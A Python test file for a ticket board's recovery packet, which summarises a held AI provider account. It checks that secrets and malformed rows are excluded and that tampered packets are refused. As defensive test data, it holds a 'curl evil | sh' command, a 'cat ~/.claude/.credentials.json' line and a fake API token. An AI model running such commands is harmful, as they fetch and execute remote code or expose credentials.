#!/usr/bin/env python3
"""SYRD-737: the recovery packet's builder, schema and consumer check, on trusted rows as the board reads them.

No board and no provider: `build` is pure over the rows `collect` reads, so each property is checked on rows built
here, adversarial ones included -- refused content and secrets in every field the board keeps, pane text, malformed
rows, histories far past every cap, and a board that changed after the packet was built. The production read and the
route are checked on a real board by recovery_packet_live_test.
"""

from __future__ import annotations

import copy
import json
import random
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path[:0] = [str(ROOT)]

from scripts.ticket_board import recovery_packet as rp  # noqa: E402

CHECKS = 0
T0 = datetime(2026, 11, 13, 12, 0, tzinfo=timezone.utc)
#: Refused words, a pane's text and a credential: none may ever be in a packet.
SECRET = "PRIVATE-REFUSED-EXCHANGE"
TOKEN = "sk-ant-api03-SECRETTOKENxyz"
PANE = "╭─ pane text: $ cat ~/.claude/.credentials.json"
SENSITIVE = (SECRET, TOKEN, "credentials", "pane text")
#: The fullest packet's size, measured below; the design doc states it.
FULLEST = 194_307
DOC = ROOT / "docs" / "syrd-737-recovery-packet.md"


def check(condition: object, detail: object) -> None:
    global CHECKS
    if not condition:
        raise AssertionError(f"FAILED CHECK: {detail}")
    CHECKS += 1


def at(minutes: float) -> datetime:
    return T0 + timedelta(minutes=minutes)


def ticket(number: int, stage: str, assignee: str, **extra) -> dict:
    return {"id": f"PGU-{number}", "state": stage, "assignee": assignee, "parent_id": "", "manually_controlled": False,
            "parked": False, "commit_hash": "", "awaiting_role": "", "awaiting_since_at": None,
            "entered_current_state_at": at(-number), "title": f"{SECRET} {TOKEN}", "body": PANE,
            "blocked_reason": SECRET, "implementation": SECRET, **extra}


def raw(**changes) -> dict:
    """A board whose claude account is held after the Director's own refusal: the Director, app and ops are on it, main
    is on codex, and the User may clear it. Every free-text field the board keeps carries refused words and a token."""
    rows = {
        "project": "p737", "ticket_prefix": "PGU", "build": "48c426a7", "generated_at": T0, "db_xmax": 9001,
        "high_water": {"event": 60, "notification": 12, "hold": 4},
        "holds": [{"id": 4, "runtime": "claude", "kind": "refusal", "category": "cyber", "source": "claude.Stop",
                   "role": "director", "ticket_id": "PGU-2", "began_at": at(-10), "began_by": "listener",
                   "notified_director": False, "refusals": 1, "reason": SECRET, "evidence": "claude:r-1",
                   "message": f"{SECRET} {TOKEN}"}],
        "roles": [
            {"name": "app", "active": True, "runtime": "claude", "controls": False, "may_clear": False},
            {"name": "audit", "active": True, "runtime": "claude", "controls": False, "may_clear": False},
            {"name": "director", "active": True, "runtime": "claude", "controls": True, "may_clear": True},
            {"name": "main", "active": True, "runtime": "codex", "controls": False, "may_clear": False},
            {"name": "ops", "active": True, "runtime": "claude", "controls": False, "may_clear": False},
            {"name": "retired", "active": False, "runtime": "codex", "controls": False, "may_clear": False},
            {"name": "user", "active": True, "runtime": None, "controls": False, "may_clear": True},
        ],
        "assignments": [
            {"role": role, "generation": generation, "registered_at": at(-60), "worktree": f"/home/x/{SECRET}",
             "actual_target": "p737-x:0.0", "session_dir": "/home/x/.claude", "process_pid": 4242, "pane_text": PANE}
            for role, generation in (("app", 2), ("director", 7), ("main", 1), ("ops", 3))],
        "tickets": [
            ticket(1, "in_progress", "main", commit_hash="48C426A73AF8EF92E960DC11331091039758A6FC"),
            ticket(2, "director_review", "director", manually_controlled=True),
            ticket(3, "backlog", "unassigned", parent_id="PGU-1"),
            # Owned by main, on the unheld codex account, and waiting on the held Director: affected by its wait alone.
            ticket(4, "in_progress", "main", awaiting_role="director", awaiting_since_at=at(-5)),
            ticket(5, "in_progress", "app", parked=True),
        ],
        "blockers": [
            {"ticket_id": "PGU-3", "blocker_ticket_id": "PGU-1", "resolved": False, "position": 0},
            {"ticket_id": "PGU-3", "blocker_ticket_id": "operator:eric", "resolved": False, "position": 1},
            {"ticket_id": "PGU-1", "blocker_ticket_id": "mefp:MEFP-9", "resolved": True, "position": 0},
        ],
        "notifications": [
            {"id": 10, "ticket_id": "PGU-2", "kind": "escalation", "target_role": "director", "payload_kind": "escalation",
             "attempts": 2, "created_at": at(-9), "next_attempt_at": at(1), "claimed": False,
             "message": f"{SECRET} {TOKEN}", "last_error": PANE, "dedupe_key": SECRET},
            {"id": 11, "ticket_id": "PGU-1", "kind": "transition", "target_role": "main", "payload_kind": None,
             "attempts": 0, "created_at": at(-8), "next_attempt_at": at(-8), "claimed": True, "message": SECRET},
            {"id": 12, "ticket_id": "PGU-5", "kind": "ticket_update", "target_role": "app", "payload_kind": "comment",
             "attempts": 1, "created_at": at(-7), "next_attempt_at": at(3), "claimed": False, "message": SECRET},
        ],
        "notification_total": 3,
        "events": [
            {"id": 50, "at": at(-30), "ticket_id": "PGU-1", "event": "PGU-1 moved analysis -> in_progress"},
            {"id": 51, "at": at(-29), "ticket_id": "PGU-1", "event": "PGU-1 assigned to main"},
            {"id": 52, "at": at(-20), "ticket_id": "PGU-3", "event": "PGU-3 blocker operator:eric set"},
            {"id": 53, "at": at(-19), "ticket_id": "PGU-4", "event": "PGU-4 waits on director"},
            {"id": 54, "at": at(-18), "ticket_id": "PGU-1", "event": "PGU-1 candidate 48c426a73af8"},
            {"id": 55, "at": at(-17), "ticket_id": "PGU-4", "event": "PGU-4 transition notice delivered to its owner"},
            {"id": 56, "at": at(-16), "ticket_id": "PGU-2", "event": "PGU-2 held"},
            {"id": 57, "at": at(-15), "ticket_id": "PGU-1", "event": "PGU-1 checkpoint by main"},
            {"id": 58, "at": at(-14), "ticket_id": "PGU-5", "event": "PGU-5 parked"},
            {"id": 59, "at": at(-13), "ticket_id": "PGU-1", "event": "PGU-1 candidate "},
            {"id": 60, "at": at(-12), "ticket_id": "PGU-3", "event": "PGU-3 created in backlog"},
        ],
        "event_total": 11,
    }
    rows.update(changes)
    return rows


def encoded(packet: dict) -> str:
    try:
        text = rp.render(packet)
    except rp.PacketError:
        text = ""
    return rp.canonical(packet).decode("ascii") + "\n" + text


def valid(packet: dict) -> dict:
    """A built packet must validate: a failed check here, never a crash."""
    found = problems(packet)
    check(found == [], f"the built packet validates: {found}")
    return packet


def attempt(call, *args, **kwargs):
    """A call that should answer: its refusal is this suite's failed check, never a crash."""
    try:
        return call(*args, **kwargs)
    except (rp.PacketError, ValueError, KeyError, TypeError) as exc:
        return {"error": f"{type(exc).__name__}: {exc}"[:400]}


def sensitive_in(text: str) -> list[str]:
    return [word for word in SENSITIVE if word in text]


def redigest(packet: dict) -> dict:
    """Re-seal an edited packet, so the schema's own rules -- not just the digests -- must find the edit."""
    content = {k: v for k, v in packet.items() if k not in ("provenance", "packet_digest")}
    packet["provenance"]["state_digest"] = rp.digest(content)
    packet["packet_digest"] = rp.digest({k: v for k, v in packet.items() if k != "packet_digest"})
    return packet


def problems(packet: dict) -> list[str]:
    try:
        rp.validate(packet)
    except rp.PacketError as exc:
        return exc.problems
    return []


def test_the_packet_holds_the_hold_and_the_coordination_state() -> None:
    packet = valid(rp.build(raw()))
    hold = packet["hold"]
    check(hold == {"id": 4, "runtime": "claude", "kind": "refusal", "category": "cyber", "source": "claude.Stop",
                   "role": "director", "ticket": "PGU-2", "began_at": "2026-11-13T11:50:00.000000Z", "began_by": "listener",
                   "refusals": 1, "director_notified": False, "roles": ["app", "audit", "director", "ops"],
                   "director_held": True},
          f"the hold: its id and sanitized classification, the account, the roles it holds, the Director held: {hold}")
    check(packet["affected"] == {"roles": ["app", "audit", "director", "ops"], "tickets": ["PGU-2", "PGU-4", "PGU-5"]},
          f"affected: the held roles, and the tickets they own, wait on, or the hold names: {packet['affected']}")
    check(packet["choices"] == [
        {"choice": "inspect_manually"},
        {"choice": "move_work", "command": "switchyard set-role-runtime", "roles": ["app", "audit", "director", "ops"],
         "to": ["codex"]},
        {"choice": "clear_hold", "command": "ticket-board-write clear-provider-account-hold claude --reason-file PATH",
         "requires": "operator_confirms_account_safe", "by": ["user"]}],
        f"the board's choices, as fixed commands; only the unheld User may clear the Director's account: {packet['choices']}")
    roles = {r["role"]: r for r in packet["roles"]}
    check(sorted(roles) == ["app", "audit", "director", "main", "ops", "user"]
          and roles["director"] == {"role": "director", "runtime": "claude", "registered": True, "generation": 7,
                                    "registered_at": "2026-11-13T11:00:00.000000Z", "held_by": 4, "controls": True,
                                    "may_clear": True}
          and roles["audit"]["registered"] is False and roles["audit"]["held_by"] == 4
          and roles["main"]["held_by"] is None and roles["user"]["runtime"] is None,
          f"every active role's account, registered or declared, and whether held; the retired role left out: {roles}")
    tickets = {t["id"]: t for t in packet["tickets"]}
    check(tickets["PGU-3"]["blockers"] == [{"id": "PGU-1", "resolved": False}, {"id": "operator:eric", "resolved": False}]
          and tickets["PGU-3"]["parent"] == "PGU-1" and tickets["PGU-4"]["awaiting"] == "director"
          and tickets["PGU-4"]["awaiting_since"] == "2026-11-13T11:55:00.000000Z"
          and tickets["PGU-1"]["commit"] == "48c426a73af8ef92e960dc11331091039758a6fc"
          and tickets["PGU-2"]["manually_controlled"] and tickets["PGU-5"]["parked"]
          and tickets["PGU-1"]["blockers"] == [{"id": "mefp:MEFP-9", "resolved": True}],
          f"each active ticket's stage, owner, parent, blockers, wait, hold, park and candidate: {tickets}")
    notices = packet["notifications"]
    check([(n["id"], n["to"], n["about"], n["held"], n["claimed"]) for n in notices]
          == [(10, "director", "escalation", True, False), (11, "main", None, False, True),
              (12, "app", "comment", True, False)],
          f"pending notifications, with whether each waits on a held account: {notices}")
    events = packet["events"]
    check([e["type"] for e in events] == ["moved", "assigned", "blocker", "waits", "candidate", "delivered", "held",
                                          "checkpoint", "parked", "candidate_cleared", "created"]
          and events[0] == {"id": 50, "at": "2026-11-13T11:30:00.000000Z", "type": "moved", "ticket": "PGU-1",
                            "from": "analysis", "to": "in_progress"}
          and events[5]["role"] is None and events[2]["blocker"] == "operator:eric" and events[2]["change"] == "set",
          f"the durable board events, parsed back into fields: {events}")
    prov = packet["provenance"]
    check(prov["project"] == "p737" and prov["ticket_prefix"] == "PGU" and prov["build"] == "48c426a7"
          and prov["generated_at"] == "2026-11-13T12:00:00.000000Z" and prov["db_xmax"] == 9001
          and prov["high_water"] == {"event": 60, "notification": 12, "hold": 4}
          and prov["state_digest"].startswith("sha256:"),
          f"provenance: which board, which build, when, which database snapshot, and the state's digest: {prov}")
    check(len(rp.canonical(packet)) <= rp.MAX_BYTES, "within its bound")


def test_identical_trusted_state_gives_an_equivalent_packet() -> None:
    first = rp.build(raw())
    later = rp.build(raw(generated_at=at(45), db_xmax=12345))
    check(first["provenance"]["state_digest"] == later["provenance"]["state_digest"]
          and {k: v for k, v in first.items() if k not in ("provenance", "packet_digest")}
          == {k: v for k, v in later.items() if k not in ("provenance", "packet_digest")}
          and first["packet_digest"] != later["packet_digest"],
          "the same state built later is the same packet: only when, and the snapshot it was read in, differ")
    # Three current holds: the packet for the claude hold names the other two, in id order whatever the read's order.
    several = raw()
    several["holds"] += [dict(several["holds"][0], id=hold_id, runtime=rt, role="main", reason=SECRET)
                         for hold_id, rt in ((14, "codex"), (24, "agy"))]
    ordered = valid(rp.build(several, hold=4))
    check([h["id"] for h in ordered["other_holds"]] == [14, 24], f"the other holds, by id: {ordered['other_holds']}")
    rng = random.Random(737)
    for _turn in range(4):
        shuffled = raw(holds=list(several["holds"]))
        for key in ("holds", "roles", "assignments", "tickets", "blockers", "notifications", "events"):
            rng.shuffle(shuffled[key])
        again = attempt(rp.build, shuffled, hold=4)
        check(rp.canonical(again) == rp.canonical(ordered) and problems(again) == [],
              "rows read in any order, the holds' included, give the same valid packet, byte for byte")
    rows = raw()
    rows["tickets"][0] = dict(rows["tickets"][0], title="another title", body="another body")
    check(rp.build(rows)["provenance"]["state_digest"] == first["provenance"]["state_digest"],
          "what the packet leaves out cannot change it")
    rows = raw()
    rows["tickets"][2] = dict(rows["tickets"][2], state="in_progress", assignee="ops")
    moved = rp.build(rows)
    check(moved["provenance"]["state_digest"] != first["provenance"]["state_digest"]
          and "PGU-3" in moved["affected"]["tickets"],
          "a ticket moved to a held role is a different state, and affected")


def test_refused_content_and_secrets_cannot_enter() -> None:
    packet = rp.build(raw())
    check(sensitive_in(encoded(packet)) == [],
          f"titles, bodies, messages, errors, reasons, worktrees and pane text never enter: {sensitive_in(encoded(packet))}")
    # The same words where the packet does read a field: each such row is dropped whole and counted, never kept cleaned.
    rows = raw()
    rows["events"] = rows["events"] + [
        {"id": 61, "at": at(-11), "ticket_id": "PGU-1", "event": f"PGU-1 moved analysis -> in_progress {SECRET}"},
        {"id": 62, "at": at(-10), "ticket_id": "PGU-1", "event": f"PGU-1 checkpoint by {TOKEN}"},
        {"id": 63, "at": at(-9), "ticket_id": "PGU-1", "event": PANE}]
    rows["notifications"] = rows["notifications"] + [
        {"id": 13, "ticket_id": "PGU-1", "kind": "escalation", "target_role": "director", "payload_kind": SECRET,
         "attempts": 0, "created_at": at(-1), "next_attempt_at": at(-1), "claimed": False}]
    rows["tickets"] = rows["tickets"] + [ticket(6, f"in_progress {SECRET}", "main"), ticket(7, "backlog", TOKEN),
                                         ticket(8, "backlog", "main", commit_hash=TOKEN)]
    rows["blockers"] = rows["blockers"] + [{"ticket_id": "PGU-1", "blocker_ticket_id": PANE, "resolved": False, "position": 5}]
    rows["roles"] = rows["roles"] + [{"name": SECRET, "active": True, "runtime": "codex", "controls": False, "may_clear": True}]
    rows["notification_total"], rows["event_total"] = 4, 14
    dirty = valid(rp.build(rows))
    check(sensitive_in(encoded(dirty)) == [] and dirty["omitted"]["malformed"]
          == {"roles": 1, "tickets": 3, "blockers": 1, "notifications": 1, "events": 3},
          f"a refused word in a read field drops its row and counts it: {dirty['omitted']} {sensitive_in(encoded(dirty))}")
    check(dirty["tickets"] == packet["tickets"] and dirty["events"] == packet["events"]
          and dirty["notifications"] == packet["notifications"] and dirty["roles"] == packet["roles"],
          "the rows that do read are exactly the clean board's")
    for field, value in (("category", f"cyber {SECRET}"), ("source", PANE), ("began_by", TOKEN), ("role", SECRET)):
        rows = raw()
        rows["holds"] = [dict(rows["holds"][0], **{field: value})]
        try:
            rp.build(rows)
            refused = ""
        except ValueError as exc:
            refused = str(exc)
        check("does not read as one" in refused and SECRET not in refused and TOKEN not in refused,
              f"a hold whose {field} carries anything but its pattern builds no packet: {refused!r}")


def test_malformed_rows_are_dropped_and_counted() -> None:
    rows = raw()
    rows["tickets"] = rows["tickets"] + [
        dict(ticket(9, "backlog", "main"), entered_current_state_at=datetime(2026, 11, 13, 12)),  # no zone
        dict(ticket(10, "backlog", "main"), manually_controlled="no"),
        {k: v for k, v in ticket(11, "backlog", "main").items() if k != "parked"},
        None, "PGU-12"]
    rows["notifications"] = rows["notifications"] + [
        dict(rows["notifications"][0], id=14, attempts="2"), dict(rows["notifications"][0], id=True),
        dict(rows["notifications"][0], id=15, kind="whisper")]
    rows["events"] = rows["events"] + [
        {"id": 64, "at": at(-1), "ticket_id": "PGU-3", "event": "PGU-1 assigned to main"},  # about another ticket
        {"id": 65, "at": "yesterday", "ticket_id": "PGU-1", "event": "PGU-1 held"}, {"id": 66}]
    rows["assignments"] = rows["assignments"] + [{"role": "main", "generation": 0, "registered_at": at(0)}]
    rows["roles"] = rows["roles"] + [{"name": "ghost", "active": "yes", "runtime": "codex", "controls": False, "may_clear": False}]
    rows["notification_total"], rows["event_total"] = 6, 14
    packet = valid(rp.build(rows))
    clean = rp.build(raw())
    check(packet["omitted"]["malformed"] == {"roles": 1, "tickets": 5, "blockers": 0, "notifications": 3, "events": 3}
          and packet["tickets"] == clean["tickets"] and packet["roles"] == clean["roles"]
          and packet["events"] == clean["events"],
          f"wrong types, unzoned times, missing fields and foreign events are dropped and counted: {packet['omitted']}")
    check(packet["omitted"]["notifications"] == 0 and packet["omitted"]["events"] == 0,
          f"a dropped row is counted once, as unreadable, not also as left out: {packet['omitted']}")
    for hold in ({**raw()["holds"][0], "began_at": "noon"}, {**raw()["holds"][0], "kind": "maybe"}, None):
        try:
            rp.build(raw(holds=[hold]))
            refused = False
        except ValueError:
            refused = True
        check(refused, f"an unreadable current hold builds no packet: {hold}")
    for holds, want in (([], "no provider account is held now"), (raw()["holds"] + [dict(raw()["holds"][0], id=5, runtime="codex")],
                                                                   "more than one provider account is held now")):
        try:
            rp.build(raw(holds=holds))
            said = ""
        except ValueError as exc:
            said = str(exc)
        check(want in said, f"with {len(holds)} holds and none named, it says so: {said!r}")
    try:
        rp.build(raw(), hold=99)
        said = ""
    except ValueError as exc:
        said = str(exc)
    check("hold 99 is not a current provider account hold" in said, f"a hold that is not current: {said!r}")


def test_oversized_histories_are_bounded_deterministically() -> None:
    rows = raw()
    rows["tickets"] = [ticket(n, "in_progress" if n % 3 else "backlog", ("app" if n % 7 == 0 else "main") if n % 3 else "unassigned")
                       for n in range(1, 1001)]
    rows["blockers"] = [{"ticket_id": "PGU-7", "blocker_ticket_id": f"PGU-{2000 + i}", "resolved": i % 2 == 0, "position": i}
                        for i in range(40)]
    rows["notifications"] = [{"id": i, "ticket_id": f"PGU-{i}", "kind": "nudge", "target_role": "app" if i % 5 == 0 else "main",
                              "payload_kind": None, "attempts": 0, "created_at": at(-i), "next_attempt_at": at(i),
                              "claimed": False} for i in range(1, 401)]
    rows["notification_total"] = 900
    rows["events"] = [{"id": i, "at": at(-1000 + i), "ticket_id": f"PGU-{i % 50 + 1}",
                       "event": f"PGU-{i % 50 + 1} checkpoint by main"} for i in range(1, 301)]
    rows["event_total"] = 5000
    packet = valid(rp.build(rows))
    affected = [n for n in range(1, 1001) if n % 3 and n % 7 == 0]
    owned = [n for n in range(1, 1001) if n % 3 and n % 7]
    check(len(packet["tickets"]) == rp.MAX_TICKETS and packet["omitted"]["tickets"] == 1000 - rp.MAX_TICKETS
          and [t["id"] for t in packet["tickets"]]
          == [f"PGU-{n}" for n in sorted(affected + owned[:rp.MAX_TICKETS - len(affected)])],
          f"tickets: the cap keeps every affected one, then the owned ones, lowest first: {packet['omitted']}")
    seven = next(t for t in packet["tickets"] if t["id"] == "PGU-7")
    check(seven["blockers"] == [{"id": f"PGU-{2000 + i}", "resolved": i % 2 == 0} for i in range(rp.MAX_BLOCKERS)]
          and seven["blockers_omitted"] == 40 - rp.MAX_BLOCKERS,
          f"a ticket's blockers: the first by position, the rest counted: {seven['blockers_omitted']}")
    check([n["id"] for n in packet["notifications"]]
          == sorted([i for i in range(1, 401) if i % 5 == 0][:rp.MAX_NOTIFICATIONS])
          and packet["omitted"]["notifications"] == 900 - rp.MAX_NOTIFICATIONS,
          f"notifications: those waiting on the held account first, oldest first; the rest counted: {packet['omitted']}")
    check([e["id"] for e in packet["events"]] == list(range(251, 301)) and packet["omitted"]["events"] == 5000 - 300,
          f"events: the newest window, in order; older history counted, never carried: {packet['omitted']}")
    for seed in (1, 2, 3):
        shuffled = copy.deepcopy(rows)
        for key in ("tickets", "blockers", "notifications", "events"):
            random.Random(seed).shuffle(shuffled[key])
        check(rp.canonical(rp.build(shuffled)) == rp.canonical(packet), f"the same choice whatever the read order (seed {seed})")
    # A notice is held when its target is an active role on a held account, whether or not the role cap kept that role;
    # the board's notice read ranks by the same test.
    rows = raw()
    rows["roles"] = [dict(r, runtime="claude") if r["name"] == "retired" else r for r in rows["roles"]]
    rows["roles"] += [{"name": f"zz{i:02d}", "active": True, "runtime": "claude" if i == 69 else "codex", "controls": False,
                       "may_clear": False} for i in range(70)]
    rows["notifications"] = [dict(rows["notifications"][1], id=20, target_role="zz69"),
                             dict(rows["notifications"][1], id=21, target_role="retired")]
    packet = valid(rp.build(rows))
    check("zz69" not in {r["role"] for r in packet["roles"]}
          and [(n["to"], n["held"]) for n in packet["notifications"]] == [("zz69", True), ("retired", False)],
          f"held: an active role on the held account past the role cap; not an inactive one: {packet['notifications']}")


def test_the_largest_possible_packet_is_within_its_bound() -> None:
    """Every list at its cap and every value at its longest, for each event grammar: the bound holds for any board.
    Every role is on the held account, since a held role is named three times (hold, affected, move_work) and makes
    every ticket it owns affected; a bool is false where nothing depends on it, as false is the longer word."""
    top = 2**63 - 1  # a bigint's largest, and the validator's
    role = lambda i: ("r" + f"{i:02d}" * 32)[:64]  # noqa: E731
    big = lambda i: f"QWERTYUIOPASDFGH-{900000000 + i}"  # noqa: E731
    stage, blocker = "s" * 64, "a" * 32 + ":" + big(0)
    longest = {"created": f"{big(0)} created in {stage}", "moved": f"{big(0)} moved {stage} -> {stage}",
               "assigned": f"{big(0)} assigned to {role(0)}", "held": f"{big(0)} held",
               "released": f"{big(0)} released from hold", "parked": f"{big(0)} parked",
               "unparked": f"{big(0)} unparked", "candidate": f"{big(0)} candidate {'f' * 40}",
               "candidate_cleared": f"{big(0)} candidate ", "blocker": f"{big(0)} blocker {blocker} reopened",
               "dependency_cleared": f"{big(0)} dependency cleared", "waits": f"{big(0)} waits on {role(0)}",
               "delivered": f"{big(0)} awaiting_role notice delivered to {role(0)}",
               "checkpoint": f"{big(0)} checkpoint by {role(0)}"}
    check(sorted(longest) == sorted(kind for kind, _g, _f in rp.EVENTS), "every event grammar is measured")
    # Each value is its pattern's longest: one character more, anywhere it could go, no longer matches.
    for kind, value, longer in (("role", role(0), role(0) + "r"), ("stage", stage, stage + "s"),
                                ("ticket", big(0), "Q" + big(0)), ("ticket", big(0), big(0) + "1"),
                                ("blocker", blocker, "a" + blocker), ("category", "c" * 32, "c" * 33),
                                ("source", "s" * 64, "s" * 65), ("about", "k" * 64, "k" * 65), ("commit", "f" * 64, "f" * 65),
                                ("project", "p" * 64, "p" * 65), ("prefix", "Q" * 16, "Q" * 17), ("build", "b" * 64, "b" * 65)):
        check(rp._ok(kind, value) and not rp._ok(kind, longer), f"{value!r} is the longest {kind}")
    runtime = max(rp.RUNTIMES, key=len)  # named by every role, and in the clear command
    hold = dict(raw()["holds"][0], id=top, runtime=runtime, kind="suspected", category="c" * 32,
                source="s" * 64, role=role(0), ticket_id=big(0), began_by=role(1), refusals=top)
    rows = raw(project="p" * 64, ticket_prefix="Q" * 16, build="b" * 64, db_xmax=top,
               holds=[hold] + [dict(hold, id=top - i, runtime=rt)
                               for i, rt in enumerate((rt for rt in rp.RUNTIMES if rt != runtime), 1)],
               high_water={"event": top, "notification": top, "hold": top}, notification_total=top, event_total=top)
    rows["roles"] = [{"name": role(i), "active": True, "runtime": hold["runtime"], "controls": False,
                      "may_clear": False} for i in range(rp.MAX_ROLES)]
    rows["assignments"] = [{"role": role(i), "generation": top, "registered_at": at(0)} for i in range(rp.MAX_ROLES)]
    rows["tickets"] = [dict(ticket(0, stage, role(i % rp.MAX_ROLES)), id=big(i), parent_id=big(i + 1),
                            awaiting_role=role(1), awaiting_since_at=at(0), commit_hash="f" * 64)
                       for i in range(rp.MAX_TICKETS)]
    rows["blockers"] = [{"ticket_id": big(i), "blocker_ticket_id": "a" * 32 + ":" + big(j), "resolved": False,
                         "position": j} for i in range(rp.MAX_TICKETS) for j in range(rp.MAX_BLOCKERS + 1)]
    # Each notice to a 64-character name that is no role, so its `held` reads false, the longer word (Audit on a643e464).
    rows["notifications"] = [{"id": top - i, "ticket_id": big(i), "kind": "idle_reminder",
                              "target_role": ("z" + f"{i:02d}" * 32)[:64],
                              "payload_kind": "k" * 64, "attempts": top, "created_at": at(0), "next_attempt_at": at(0),
                              "claimed": False} for i in range(rp.MAX_NOTIFICATIONS)]
    sizes = {}
    for kind, text in longest.items():
        rows["events"] = [{"id": top - i, "at": at(0), "ticket_id": big(0), "event": text} for i in range(rp.MAX_EVENTS)]
        packet = attempt(rp.build, rows, hold=top)
        if "error" in packet:
            check(False, f"the fullest packet with {kind} events builds: {packet['error']}")
        # Counts no real board reaches, but the schema takes: each at a bigint's largest.
        packet["omitted"] = {k: top for k in ("roles", "tickets", "notifications", "events")}
        packet["omitted"]["malformed"] = {k: top for k in ("roles", "tickets", "blockers", "notifications", "events")}
        for t in packet["tickets"]:
            t["blockers_omitted"] = top
        valid(redigest(packet))
        sizes[kind] = len(rp.canonical(packet))
    check(len(packet["tickets"]) == rp.MAX_TICKETS and len(packet["roles"]) == rp.MAX_ROLES
          and len(packet["events"]) == rp.MAX_EVENTS and len(packet["notifications"]) == rp.MAX_NOTIFICATIONS
          and all(len(t["blockers"]) == rp.MAX_BLOCKERS for t in packet["tickets"]) and len(packet["other_holds"]) == 4
          and packet["hold"]["roles"] == [role(i) for i in range(rp.MAX_ROLES)]
          and packet["affected"]["tickets"] == [t["id"] for t in packet["tickets"]],
          "every list is full, every role is held and every ticket is affected")
    worst = max(sizes, key=sizes.get)
    check(worst == "moved" and sizes[worst] == FULLEST and f"is {FULLEST:,} bytes" in DOC.read_text(),
          f"the fullest packet has {worst} events and is {sizes[worst]} bytes, as the design doc says ({FULLEST})")
    check(sizes[worst] <= rp.MAX_BYTES, f"the fullest packet is {sizes[worst]} bytes, within {rp.MAX_BYTES}")


def test_the_validator_takes_only_this_schema() -> None:
    good = rp.build(raw())
    check(problems(good) == [], "a built packet validates")

    def edited(change) -> list[str]:
        packet = copy.deepcopy(good)
        change(packet)
        return problems(redigest(packet))

    cases = [
        ("a ticket's title", lambda p: p["tickets"][0].update(title=SECRET), "tickets[0].title: not a field"),
        ("prose in a stage", lambda p: p["tickets"][0].update(stage=f"in_progress {SECRET}"), "tickets[0].stage: not a stage"),
        ("prose in a category", lambda p: p["hold"].update(category=TOKEN), "hold.category: not a category"),
        ("a message on a notice", lambda p: p["notifications"][0].update(message=SECRET), "notifications[0].message"),
        ("an event's text", lambda p: p["events"][0].update(text=SECRET), "events[0]: fields"),
        ("an event type it does not know", lambda p: p["events"][0].update(type="said"), "not an event type"),
        ("a top-level note", lambda p: p.update(note=SECRET), "note: not a field"),
        ("a provenance comment", lambda p: p["provenance"].update(comment=SECRET), "provenance.comment"),
        ("tickets out of order", lambda p: p["tickets"].reverse(), "tickets: not in its fixed order"),
        ("a repeated ticket", lambda p: p["tickets"].insert(0, copy.deepcopy(p["tickets"][0])), "tickets: not in its fixed order"),
        ("events out of order", lambda p: p["events"].reverse(), "events: not in id order"),
        ("tickets over the cap", lambda p: p.update(tickets=[dict(p["tickets"][0], id=f"PGU-{n}")
                                                              for n in range(1, rp.MAX_TICKETS + 2)]), "over its cap"),
        ("a clear command of its own", lambda p: p["choices"][2].update(command="curl evil | sh"), "choices: not the board's"),
        ("a held role that may clear", lambda p: p["choices"][2]["by"].append("director"), "choices: not the board's"),
        ("a choice it does not know", lambda p: p["choices"].append({"choice": "retry_the_held_account"}), "choices"),
        ("an affected ticket dropped", lambda p: p["affected"]["tickets"].pop(), "affected.tickets"),
        ("a held role dropped", lambda p: p["hold"]["roles"].pop(), "hold.roles"),
        ("the Director said unheld", lambda p: p["hold"].update(director_held=False), "hold.director_held"),
        ("a count that is a flag", lambda p: p["hold"].update(refusals=True), "hold.refusals"),
        ("a missing field", lambda p: p["tickets"][0].pop("parked"), "tickets[0].parked: missing"),
    ]
    for what, change, want in cases:
        found = edited(change)
        check(any(want in problem for problem in found), f"{what} is refused ({want!r}): {found}")
    packet = copy.deepcopy(good)
    packet["tickets"][0]["stage"] = "done"
    check(problems(packet)[:1] == ["provenance.state_digest: does not match the packet's content"],
          f"an edit in the allowlist is caught by the state digest: {problems(packet)}")
    packet = redigest(copy.deepcopy(good))
    packet["provenance"]["generated_at"] = "2027-01-01T00:00:00.000000Z"
    check(problems(packet) == ["packet_digest: does not match the packet"],
          f"an edit to the provenance is caught by the packet digest: {problems(packet)}")
    for bad in (dict(good, version=2), dict(good, schema="other"), [good], None):
        check(problems(bad) != [], f"not this schema or version: {str(bad)[:40]}")
    check(problems(dict(copy.deepcopy(good), db=float("nan"))) != [], "not JSON")
    try:
        rp.render(dict(good, note=SECRET))
        rendered = True
    except rp.PacketError:
        rendered = False
    check(not rendered, "an invalid packet is never rendered")
    text = attempt(rp.render, good)
    text = text if isinstance(text, str) else str(text)
    check("hold 4" in text and "the claude account" in text and "clear-provider-account-hold claude" in text
          and "*PGU-2 [director_review/director]" in text and sensitive_in(text) == [],
          f"a valid one renders from its fields alone: {text[:400]}")


def test_consumers_verify_schema_and_provenance() -> None:
    packet = rp.build(raw())
    same = rp.build(raw(generated_at=at(5), db_xmax=9100))
    verdict = attempt(rp.verify, packet, project="p737", fresh=same)
    check(verdict == {"hold": 4, "runtime": "claude", "generated_at": "2026-11-13T12:00:00.000000Z",
                      "state_digest": packet["provenance"]["state_digest"], "current": True, "changed": []},
          f"the board still reads as the packet says: {verdict}")
    rows = raw(generated_at=at(6))
    rows["tickets"][2] = dict(rows["tickets"][2], state="in_progress", assignee="ops")
    rows["events"] = rows["events"] + [{"id": 61, "at": at(5), "ticket_id": "PGU-3", "event": "PGU-3 moved backlog -> in_progress"}]
    stale = attempt(rp.verify, packet, project="p737", fresh=rp.build(rows))
    check(stale.get("current") is False and stale.get("changed") == ["affected", "tickets", "events"],
          f"after a change the packet is stale, and says what changed: {stale}")

    def refused(packet, *, project="p737", fresh=same) -> str:
        try:
            rp.verify(packet, project=project, fresh=fresh)
        except rp.PacketError as exc:
            return str(exc)
        return ""

    other_board = rp.build(raw(project="mefp", generated_at=at(5)))
    two = raw(generated_at=at(5), holds=raw()["holds"] + [dict(raw()["holds"][0], id=5, runtime="codex", role="main")])
    check("not 'p737'" in refused(packet, project="p737", fresh=other_board), "the board answering is another project's")
    check("is project 'p737', not 'mefp'" in refused(packet, project="mefp", fresh=other_board), "the packet is another project's")
    check("not hold 4" in refused(packet, fresh=rp.build(two, hold=5)), "the board answered for another hold")
    check("older than the packet" in refused(rp.build(raw(generated_at=at(9))), fresh=same), "a fresh answer older than the packet")
    tampered = copy.deepcopy(packet)
    tampered["tickets"][0]["stage"] = "done"
    check("state_digest" in refused(tampered), "a tampered packet")
    check("the board's own packet now" in refused(packet, fresh=dict(same, version=2)), "a fresh answer that does not validate")
